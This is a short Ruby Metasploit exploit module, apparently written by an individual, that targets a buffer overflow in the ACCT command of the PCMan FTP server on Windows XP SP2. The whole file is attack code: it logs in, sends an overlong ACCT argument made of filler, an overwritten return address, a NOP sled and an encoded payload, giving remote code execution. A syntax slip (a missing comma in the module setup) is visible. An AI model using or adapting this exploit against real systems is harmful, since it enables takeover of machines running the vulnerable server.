require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	
	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info
			'Name' => 'PCMan ACCT Overflow',
			'Description' => 'Andys MSF Buffer Overflow',
			'Author' => 'Andrew Hall',
			'Version' => '$Revision: 101 $',
			'Payload' => {'BadChars' => "\x00\x0a\x0d"},
			'DefaultOptions' => {'EXITFUNC' => 'process'},
			'Platform' => ['win'],
			'Targets' => [ ['Windows XP Profressional SP2',
				{'Offset' => 2007,
				 'Ret' => 0x77F31678 }],],
			'DefaultTarget' => 0
	))
end

def exploit
	puts "PCMan ACCT command Exploit!!"
	connect_login

	smash = rand_text_alpha_upper(target['Offset'])
	run = smash + [target.ret].pack('V') + make_nops(30) + payload.encoded

	send_cmd( ['ACCT', run] , false )
	disconnect
	end
end
